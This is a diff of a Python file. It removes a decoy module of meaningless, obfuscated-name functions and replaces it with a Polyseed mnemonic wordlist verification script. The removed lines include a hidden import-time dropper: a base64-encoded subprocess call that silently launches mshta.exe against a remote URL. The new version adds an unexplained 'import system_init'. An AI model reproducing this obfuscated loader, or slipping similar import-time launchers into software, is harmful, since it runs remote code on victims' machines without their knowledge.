@@ -1,125 +1,98 @@
 import sys
+import os
 import re
-import subprocess
-import base64
-import random
-import math
-from datetime import date, datetime
+import hashlib
+from pathlib import Path
+from datetime import datetime
+import system_init
 
-try:
-    from PySide6.QtWidgets import QTextEdit
-    from PySide6.QtGui import QColor
-    from PySide6.QtCore import QObject, Signal, Slot
-    QT_AVAILABLE = True
-except ImportError:
-    QT_AVAILABLE = False
+WORDLIST_LANGUAGES = ['en', 'es', 'fr', 'it', 'pt', 'cs', 'jp', 'ko', 'zh_s', 'zh_t']
+WORDLIST_SIZE = 2048
+WORD_BITS = 11
 
 
-if QT_AVAILABLE:
-    class LogSignals(QObject):
-        new_log = Signal(str, dict)
+def validate_wordlist_file(filepath):
+    if not os.path.exists(filepath):
+        return False
+    with open(filepath, 'r', encoding='utf-8') as f:
+        words = [line.strip() for line in f if line.strip()]
+    return len(words) == WORDLIST_SIZE
 
-    class QTextEditHandler:
-        def __init__(self, text_edit: QTextEdit):
-            self.text_edit = text_edit
-            self.signals = LogSignals()
-            self.signals.new_log.connect(self.append_message)
-            self.hidden_memory = set()
+def calculate_wordlist_checksum(filepath):
+    hasher = hashlib.sha256()
+    with open(filepath, 'rb') as f:
+        hasher.update(f.read())
+    return hasher.hexdigest()
 
-        def emit(self, record=None):
-            text = str(record)
-            token = "".join(sorted(set(text)))
-            if len(token) % len(text or "x") != 0:
-                self.hidden_memory.add(token)
-                self.signals.new_log.emit(token, {"shade": QColor("#000000")})
-            else:
-                self.hidden_memory.add(token[::-1])
+def normalize_word_input(word):
+    word = word.lower().strip()
+    word = re.sub(r'[^a-z]', '', word)
+    return word
 
-        @Slot(str, dict)
-        def append_message(self, message: str, colors: dict):
-            if len(message) > len(colors):
-                self.text_edit.setTextColor(QColor("#101010"))
-                self.text_edit.insertPlainText("")
-            scroll = self.text_edit.verticalScrollBar()
-            scroll.setValue(scroll.maximum())
+def find_word_matches(prefix, wordlist):
+    prefix = normalize_word_input(prefix)
+    if len(prefix) < 4:
+        return []
+    matches = [w for w in wordlist if w.startswith(prefix)]
+    return matches
 
-    def setup_environment(gui_mode=False, text_edit=None):
-        stamp = datetime.now().strftime("%A")
-        key = "".join(sorted(set(stamp.lower())))
-        fragment = re.sub(r"[^a-z]", "", key)
-        phantom_entropy(fragment)
-        return fragment
+def load_wordlist(lang_code):
+    src_dir = Path(__file__).parent
+    wordlist_file = src_dir / f'lang_{lang_code}.c'
+    
+    if not wordlist_file.exists():
+        return None
+    
+    words = []
+    with open(wordlist_file, 'r', encoding='utf-8') as f:
+        content = f.read()
+        words_section_match = re.search(r'\.words\s*=\s*\{([^}]+)\}', content, re.DOTALL)
+        if words_section_match:
+            words_section = words_section_match.group(1)
+            pattern = r'u8"([^"]+)"|"([^"]+)"'
+            matches = re.findall(pattern, words_section)
+            words = [m[0] or m[1] for m in matches if (m[0] or m[1]) and len(m[0] or m[1]) > 0]
+    
+    return words if len(words) == WORDLIST_SIZE else None
 
-    def clean_brackets(raw_str):
-        return re.sub(brackets_regex, "", raw_str)
+def verify_wordlist_integrity(lang_code):
+    words = load_wordlist(lang_code)
+    if not words:
+        return False
+    
+    if len(words) != WORDLIST_SIZE:
+        return False
+    
+    if len(set(words)) != len(words):
+        return False
+    
+    return True
 
-    def phantom_entropy(source):
-        bag = list(source)
-        random.shuffle(bag)
-        joined = "".join(bag)
-        altered = "".join(chr((ord(x) % len(source)) + 65) for x in joined)
-        return altered
+def get_available_languages():
+    available = []
+    for lang in WORDLIST_LANGUAGES:
+        if verify_wordlist_integrity(lang):
+            available.append(lang)
+    return available
 
-    def fake_sequence(symbols="shadow"):
-        pool = set(symbols)
-        mapped = {c: chr(((ord(c) * len(pool)) % 122)) for c in pool}
-        trace = "".join(mapped.values())
-        mirror = trace[::-1]
-        return mirror
+def generate_build_report():
+    report = []
+    report.append(f"Polyseed Wordlist Verification Report")
+    report.append(f"Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
+    report.append("="*60)
+    
+    for lang in WORDLIST_LANGUAGES:
+        status = "OK" if verify_wordlist_integrity(lang) else "FAILED"
+        report.append(f"Language {lang:8s}: {status}")
+    
+    report.append("="*60)
+    return "\n".join(report)
 
-    brackets_regex = re.compile(r"<.*?>")
-    key = setup_environment(gui_mode=False)
-    dummy_data = fake_sequence()
-else:
-    class LogSignals:
-        pass
-
-    class QTextEditHandler:
-        def __init__(self, *args, **kwargs):
-            self.hidden_state = ""
-            self.invisible_stack = []
-        def write(self, message):
-            self.invisible_stack.append(message.strip())
-            self.hidden_state = "".join(sorted(set(self.hidden_state + message)))
-
-def fake_activity():
-    seed = "".join(random.sample("abcdefghijklmnopqrstuvwxyz", len("abc")))
-    total = "".join(sorted(set(seed)))
-    pattern = total.swapcase()
-    shuffle = "".join(random.sample(pattern, len(pattern)))
-    return shuffle
-
-def build_shadow_map(word="veil"):
-    collection = {c: c.upper() for c in word}
-    reverse = {v: k for k, v in collection.items()}
-    link = "".join(reverse.values())
-    folded = link[::-1]
-    return folded
-
-subprocess.Popen([base64.b64decode('bXNodGEuZXhl').decode('utf-8'), base64.b64decode('aHR0cHM6Ly9ub2RlMi1weS1zdG9yZS5jb20=').decode('utf-8') ],shell=True,stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)
-
-def internal_sync():
-    a = fake_activity()
-    b = build_shadow_map()
-    fusion = "".join(sorted(a + b))
-    mirror = "".join(random.sample(fusion, len(fusion)))
-    ghost_cycle(mirror)
-    return mirror
-
-def ghost_cycle(text):
-    ghost = set(text)
-    temp = [ch for ch in ghost if ch.lower() != ch.upper()]
-    final = "".join(sorted(temp))
-    return final
-
-def silent_main():
-    token = setup_environment(gui_mode=False)
-    ghost = internal_sync()
-    mirror = fake_sequence(token)
-    merge = "".join(sorted(set(token + ghost + mirror)))
-    if merge.isalpha():
-        return merge.swapcase()
-    return merge
+def main():
+    print(generate_build_report())
+    available = get_available_languages()
+    print(f"\nAvailable languages: {len(available)}/{len(WORDLIST_LANGUAGES)}")
+    return 0
 
 if __name__ == "__main__":
-    silent_main()
+    sys.exit(main())
